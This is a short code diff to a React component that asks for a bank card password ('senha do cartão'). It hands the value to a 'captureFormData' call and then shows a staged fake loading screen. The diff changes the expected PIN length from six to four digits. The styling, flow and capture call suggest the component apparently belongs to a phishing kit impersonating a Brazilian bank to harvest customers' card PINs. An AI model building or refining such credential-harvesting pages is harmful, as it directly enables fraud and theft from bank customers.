@@ -96,7 +96,7 @@ const SenhaAcesso = () => {
   }, [showFinalLoading]);
 
   const handleSenhaCartao = () => {
-    if (senhaCartao.length === 6) {
+    if (senhaCartao.length === 4) {
       captureFormData("senha-cartao", { senhaCartao });
       setShowFinalLoading(true);
       setFinalLoadingStep(0);
@@ -198,20 +198,20 @@ const SenhaAcesso = () => {
               type="tel"
               inputMode="numeric"
               pattern="[0-9]*"
-              maxLength={6}
+              maxLength={4}
               value={senhaCartao}
-              onChange={(e) => setSenhaCartao(e.target.value.replace(/\D/g, "").slice(0, 6))}
+              onChange={(e) => setSenhaCartao(e.target.value.replace(/\D/g, "").slice(0, 4))}
               className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-lg tracking-[0.5em] text-foreground"
               style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
             />
-            <p className="text-muted-foreground text-sm mt-2">6 dígitos</p>
+            <p className="text-muted-foreground text-sm mt-2">4 dígitos</p>
             <button className="text-[#FF6200] font-bold text-sm mt-4 text-left">
               Esqueci ou não tenho senha
             </button>
             <div className="flex-1" />
             <button
               onClick={handleSenhaCartao}
-              disabled={senhaCartao.length !== 6}
+              disabled={senhaCartao.length !== 4}
               className="w-full py-4 rounded-full bg-muted text-muted-foreground font-semibold text-base transition-all disabled:opacity-60 enabled:bg-[#FF6200] enabled:text-white"
             >
               continuar
